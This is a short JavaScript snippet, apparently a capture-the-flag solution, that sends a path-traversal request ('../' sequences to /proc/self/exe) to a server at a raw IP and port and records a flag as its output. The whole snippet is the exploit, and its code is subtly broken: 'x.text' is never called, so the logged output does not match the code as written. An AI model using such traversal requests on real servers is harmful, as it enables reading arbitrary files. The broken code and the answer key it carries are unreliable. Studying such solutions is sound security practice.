const url = "http://34.68.159.75:41521/secret/../../../../../../../../proc/self/exe";
fetch(url).then((x) => x.text).then((x) => console.log(x));

// Output : pbctf{n0t_re4lly_apache_ap0che!}
